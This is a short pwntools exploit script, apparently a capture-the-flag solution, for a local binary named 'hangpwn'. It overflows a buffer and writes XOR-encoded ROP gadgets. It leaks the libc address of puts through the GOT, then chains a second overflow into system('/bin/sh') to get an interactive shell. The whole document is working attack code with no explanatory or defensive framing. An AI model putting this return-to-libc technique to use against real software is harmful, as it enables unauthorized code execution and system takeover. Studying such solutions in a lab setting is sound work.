from plumbum import RETCODE
from pwn import *


pe = process('jail/bin/hangpwn')
elf = ELF('jail/bin/hangpwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# PUTS_PLT = elf.plt['printf']
PUTS_PLT = 0x4010a0
POP_RDI = 0x00000000004016a3
RET_ADDR = 0x000000000040101a
PUTS_GOT = elf.got['puts']
MAIN_ADDR = elf.symbols['main']
# pe.s
context.log_level='debug'


def ready_overflow(pe):
    pe.send("4\n"*18*2)

ready_overflow(pe)
pe.clean()

def send_addr(addr):
    pe.sendline(chr((addr & 0xff) ^ 0x34))
    print(str((addr & 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>8) & 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>16) & 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>24)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>32)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>40)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>48)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.sendline(chr(((addr>>54)& 0xff) ^ 0x34))
    pe.sendline("asd")
    pe.clean()
    
send_addr(POP_RDI)
send_addr(PUTS_GOT)
send_addr(PUTS_PLT)
send_addr(MAIN_ADDR)


pe.sendline("1")
import time
time.sleep(1)
pe.clean()
pe.sendline("BINGAUS")
pe.readuntil("Enter word: ")
print("A")
leak=u64((pe.readline())[:-1].ljust(8, '\x00'))
libc.address = leak - libc.symbols['puts']
ready_overflow(pe)
# pe.sendline(POP_RDI)
send_addr(POP_RDI)
BINSH = next(libc.search(b"/bin/sh"))
send_addr(BINSH)
send_addr(RET_ADDR)
send_addr(libc.symbols['system'])
pe.sendline("1")
import time
time.sleep(1)
pe.clean()
pe.sendline("BINGAUS")


pe.interactive()